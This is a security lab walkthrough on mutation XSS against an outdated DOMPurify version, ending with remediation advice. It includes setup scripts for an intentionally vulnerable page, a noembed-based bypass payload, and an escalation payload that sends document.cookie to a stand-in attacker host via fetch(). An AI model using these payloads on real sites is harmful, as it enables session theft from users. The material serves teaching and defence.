# Lab 03 — Mutation XSS Against DOMPurify

## Objective

Exploit a mutation XSS vulnerability in a page that uses an outdated version of DOMPurify. The goal is to identify the sanitizer in use, determine its version, select a known bypass, and achieve JavaScript execution despite the sanitizer's presence.

---

## Prerequisites

- Understanding of HTML parsing and namespace rules (SVG/MathML)
- Familiarity with DOMPurify's behavior
- Browser DevTools knowledge (Sources, Console, Network)

---

## Setup

### Option A: Docker

```bash
docker run -d -p 8080:8080 --name lab03-mxss \
  node:18-alpine sh -c "
    npm install -g http-server 2>/dev/null
    mkdir /app
    cat > /app/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Markdown Preview (DOMPurify protected)</title>
  <!-- Intentionally vulnerable: DOMPurify 2.2.2 -->
  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.2.2/purify.min.js\"></script>
</head>
<body>
  <h1>Markdown Preview</h1>
  <p>Enter HTML/Markdown below. It is sanitized with DOMPurify before display.</p>

  <textarea id=\"input\" rows=\"8\" cols=\"60\" placeholder=\"Enter content...\"></textarea>
  <br>
  <button onclick=\"preview()\">Preview</button>

  <h2>Output:</h2>
  <div id=\"output\" style=\"border:1px solid #ccc; padding:10px; min-height:50px;\"></div>

  <script>
    function preview() {
      const input = document.getElementById('input').value;
      const clean = DOMPurify.sanitize(input);
      console.log('DOMPurify output:', clean);
      document.getElementById('output').innerHTML = clean;
    }
  </script>
</body>
</html>
EOF
    cd /app && npx http-server -p 8080 .
  "
```

### Option B: Local (no Docker)

```bash
mkdir lab03 && cd lab03

cat > index.html << 'HEREDOC'
<!DOCTYPE html>
<html>
<head>
  <title>Markdown Preview (DOMPurify protected)</title>
  <!-- Intentionally vulnerable: DOMPurify 2.2.2 -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.2.2/purify.min.js"></script>
</head>
<body>
  <h1>Markdown Preview</h1>
  <p>Enter HTML below. It is sanitized with DOMPurify before display.</p>

  <textarea id="input" rows="8" cols="60" placeholder="Enter content..."></textarea>
  <br>
  <button onclick="preview()">Preview</button>

  <h2>Output:</h2>
  <div id="output" style="border:1px solid #ccc; padding:10px; min-height:50px;"></div>

  <script>
    function preview() {
      const input = document.getElementById('input').value;
      const clean = DOMPurify.sanitize(input);
      console.log('DOMPurify output:', clean);
      document.getElementById('output').innerHTML = clean;
    }
  </script>
</body>
</html>
HEREDOC

npx http-server -p 8080 .
# or: python3 -m http.server 8080
```

Open `http://localhost:8080` in Chrome or Firefox.

---

## Step-by-Step Walkthrough

### Step 1: Identify the Sanitizer

Open DevTools → Console, type:

```javascript
typeof DOMPurify
// "object" — DOMPurify is loaded

DOMPurify.version
// "2.2.2"
```

Or inspect the Network tab for loaded scripts. The filename `purify.min.js` loaded from `cdnjs.cloudflare.com` confirms DOMPurify. The version number is in the URL path.

### Step 2: Verify Sanitization is Active

Enter a basic XSS payload in the textarea:

```html
<script>alert(1)</script>
```

Click Preview. Nothing executes. Check the Console:

```javascript
// DOMPurify output: (empty string)
```

DOMPurify removed the `<script>` tag. Sanitization is confirmed working.

### Step 3: Verify the Version's Known Bypass

DOMPurify 2.2.2 is vulnerable to the `noembed` mutation bypass. Look up the bypass:

```html
<noembed><img src="</noembed><img src=x onerror=alert(1)>">
```

Understanding why this works:
- DOMPurify parses `<noembed>` and treats its content as raw text (since scripting is enabled, `<noembed>` content never renders, so the parser treats it as raw text data).
- DOMPurify serializes the output, producing the same string it received (it appears harmless).
- When `element.innerHTML = clean` re-parses the string, the browser's HTML parser again sees `<noembed>`.
- The content `<img src="</noembed>` is treated as raw text — but because the closing `</noembed>` appears inside the attribute value, some browser/version combinations end the noembed element there.
- After `</noembed>`, the browser parses `<img src=x onerror=alert(1)>` as markup and executes the event handler.

### Step 4: Detect the Mutation

Before running the exploit, confirm the mutation occurs. Add this in the Console:

```javascript
const test = '<noembed><img src="</noembed><img src=x onerror=alert(1)>">';
const sanitized = DOMPurify.sanitize(test);
console.log('Sanitized:', sanitized);

const probe = document.createElement('div');
probe.innerHTML = sanitized;
console.log('After re-parse:', probe.innerHTML);
```

If `sanitized !== probe.innerHTML`, mutation is confirmed.

### Step 5: Execute the Payload

Enter this in the textarea and click Preview:

```html
<noembed><img src="</noembed><img src=x onerror=alert(document.domain)>">
```

`alert(document.domain)` should fire, proving XSS execution despite DOMPurify's presence.

### Step 6: Escalate

Replace `alert(document.domain)` with a full credential exfiltration payload:

```html
<noembed><img src="</noembed><img src=x onerror=fetch('https://attacker.example.com/c?d='+encodeURIComponent(document.cookie))">
```

---

## Solution

**DOMPurify 2.2.2** is vulnerable to an mXSS attack via the `noembed` element mutation pattern. The sanitizer produces a clean-looking output string, but assigning that string to `innerHTML` triggers browser re-parsing that reconstructs a dangerous DOM node containing an executable event handler.

**Working payload:**

```html
<noembed><img src="</noembed><img src=x onerror=alert(document.domain)>">
```

---

## Remediation

**Fix 1: Upgrade DOMPurify**

```bash
npm install dompurify@latest
```

As of DOMPurify 3.x, the noembed mutation bypass and earlier patterns are fixed.

**Fix 2: Use `RETURN_DOM_FRAGMENT` to avoid re-serialization**

```javascript
// Instead of:
const clean = DOMPurify.sanitize(input);         // returns a string
element.innerHTML = clean;                        // re-parses the string

// Use:
const fragment = DOMPurify.sanitize(input, { RETURN_DOM_FRAGMENT: true });
element.appendChild(fragment);                    // no re-parse — inserts the sanitized DOM directly
```

By appending the `DocumentFragment` returned by DOMPurify directly (without serializing to a string and re-parsing), the mutation loop is broken.

**Fix 3: Trusted Types integration**

```javascript
const policy = trustedTypes.createPolicy('dompurify', {
  createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true })
});
element.innerHTML = policy.createHTML(userInput);
```

---

## References

- [DOMPurify Security Advisories](https://github.com/cure53/DOMPurify/security/advisories)
- [mXSS Attacks (Heyes & Roth, Cure53)](https://cure53.de/fp170.pdf)
- [`techniques/03-mutation-xss.md`](../techniques/03-mutation-xss.md) — full mXSS technique documentation
- [`bypasses/sanitizer-bypass.md`](../bypasses/sanitizer-bypass.md) — sanitizer bypass history
